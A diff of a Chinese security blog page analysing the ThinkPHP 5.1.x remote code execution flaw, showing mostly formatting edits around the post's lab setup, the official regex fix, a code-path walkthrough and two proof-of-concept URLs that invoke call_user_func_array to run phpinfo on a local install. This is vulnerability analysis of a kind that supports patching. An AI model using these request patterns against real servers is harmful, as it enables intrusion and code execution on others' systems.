@@ -116,7 +116,6 @@
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/0078P6qQgy1g4pwu2u71hj31do03emxq.jpg">
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/0078P6qQgy1g4pwvqdj2kj312b07idgn.jpg">
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/0078P6qQgy1g4pwwmjgf5j30om02fmx6.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/0078P6qQgy1g4pwzj0g1sj317702ddfy.jpg">
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/0078P6qQly1g4px85icz5j30nf084wgv.jpg">
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/0078P6qQly1g4px1sq1hcj31c20f0jtg.jpg">
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/0078P6qQly1g4pxjhki6uj3191038q3g.jpg">
@@ -127,7 +126,7 @@
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/0078P6qQgy1g4py026abkj30y60fuq5a.jpg">
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/0078P6qQly1g4pyb5bmzmj30z402cdfw.jpg">
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/0078P6qQgy1g4pyds6fmhj31dk098wfu.jpg">
-<meta property="og:updated_time" content="2019-07-06T03:26:41.890Z">
+<meta property="og:updated_time" content="2020-02-19T08:51:49.727Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="ThinkPHP5.1.x RCE分析">
 <meta name="twitter:description" content="对于ThinkPHP5.1.x RCE原理分析">
@@ -459,14 +458,14 @@
       
 
       
-        <h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>造成这个漏洞的主要原因为1.以反斜线\开始时直接将其作为类的命名空间路径。2.thinkphp命名空间自动加载类的特性。官方采的修复方式修复：对控制器的命名规则进行正则检测：</p>
+        <h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>造成这个漏洞的主要原因为1.以反斜线\开始时直接将其作为类的命名空间路径。2.<code>thinkphp</code>命名空间自动加载类的特性。官方采的修复方式修复：对控制器的命名规则进行正则检测：</p>
 <p><code>thinkphp/library/think/route/dispatch/Url.php</code> 63行 </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    if ($controller &amp;&amp; !preg_match(&apos;/^[A-Za-z][\w|\.]*$/&apos;, $controller)) &#123;</span><br><span class="line">    throw new HttpException(404, &apos;controller not exists:&apos; . $controller);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h2 id="漏洞和分析"><a href="#漏洞和分析" class="headerlink" title="漏洞和分析"></a>漏洞和分析</h2><p>环境搭建</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php.exe composer.phar create-project topthink/think=5.1.20 tp  --prefer-dist</span><br></pre></td></tr></table></figure>
 
-<p>POC</p>
+<p><code>POC</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tp5.1.20/public/index.php?s=index/think\App/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tp5.1.20/public/index.php?s=index/think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure>
@@ -513,26 +512,25 @@
 <p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4pwvqdj2kj312b07idgn.jpg" alt=""></p>
 <p><code>thinkphp/library/think/APP.php</code> 435 调度中间件</p>
 <p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4pwwmjgf5j30om02fmx6.jpg" alt=""></p>
-<p>进入dispath()</p>
-<p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4pwzj0g1sj317702ddfy.jpg" alt=""></p>
-<p>进入resolve()</p>
+<p>进入<code>dispath()</code></p>
+<p>进入<code>resolve()</code></p>
 <p><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g4px85icz5j30nf084wgv.jpg" alt=""></p>
-<p>就会调用之前App类中的闭包函数。这里会调用Dispatch类中的run()方法</p>
+<p>就会调用之前<code>App</code>类中的闭包函数。这里会调用Dispatch类中的run()方法</p>
 <p><code>thinkphp/library/think/route</code> 168<br><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g4px1sq1hcj31c20f0jtg.jpg" alt=""></p>
-<p>进入 exec()</p>
+<p>进入 <code>exec()</code></p>
 <p><code>thinkphp/library/route/dispatch</code> 92 实例化控制类即<code>\think\container</code></p>
 <p><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g4pxjhki6uj3191038q3g.jpg" alt=""></p>
-<p>进入controller()</p>
+<p>进入<code>controller()</code></p>
 <p><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g4pxl5yidqj31dq08975x.jpg" alt=""></p>
-<p>进入parseModuleAndClass()</p>
+<p>进入<code>parseModuleAndClass()</code></p>
 <p><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g4pxongr3vj31i40d7q5l.jpg" alt=""></p>
 <p>这里一旦控制器是以<code>\</code>开头则会直接将其作为类的命名空间路径，这也是导致这个漏洞的主要原因</p>
-<p> 接着就会判断其是否存在并加载这个类，也就是container</p>
+<p> 接着就会判断其是否存在并加载这个类，也就是<code>container</code></p>
 <p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4pxrlsu9fj316x0590tl.jpg" alt=""></p>
-<p>进入make()</p>
+<p>进入<code>make()</code></p>
 <p><code>thinkphp/library/think/container.php</code> 278</p>
 <p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4pxzrm17aj319a0chtah.jpg" alt=""></p>
-<p>进入invokeFunction()</p>
+<p>进入<code>invokeFunction()</code></p>
 <p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4py026abkj30y60fuq5a.jpg" alt=""></p>
 <p>进行反射实例化</p>
 <p>在<code>thinkphp/library/think/route/dispatch/Module.php</code> 132 利用反射机制调用类方法，从而进行代码执行</p>
@@ -557,7 +555,7 @@
   <p><span>本文标题:</span><a href="/2019/07/06/ThinkPHP5.1.x RCE分析/">ThinkPHP5.1.x RCE分析</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 MuseLJH 的个人博客">MuseLJH</a></p>
   <p><span>发布时间:</span>2019年07月06日 - 11:25</p>
-  <p><span>最后更新:</span>2019年07月06日 - 11:26</p>
+  <p><span>最后更新:</span>2020年02月19日 - 16:51</p>
   <p><span>原始链接:</span><a href="/2019/07/06/ThinkPHP5.1.x RCE分析/" title="ThinkPHP5.1.x RCE分析">https://museljh.github.io/2019/07/06/ThinkPHP5.1.x RCE分析/</a>
     <span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://museljh.github.io/2019/07/06/ThinkPHP5.1.x RCE分析/" aria-label="复制成功！"></i></span>
   </p>
@@ -613,8 +611,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/05/30/mysql注入小结/" rel="next" title="mysql注入小结">
-                <i class="fa fa-chevron-left"></i> mysql注入小结
+              <a href="/2019/05/30/mysql注入小结/" rel="next" title="">
+                <i class="fa fa-chevron-left"></i> 
               </a>
             
           </div>
@@ -704,7 +702,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">34</span>
+                  <span class="site-state-item-count">35</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
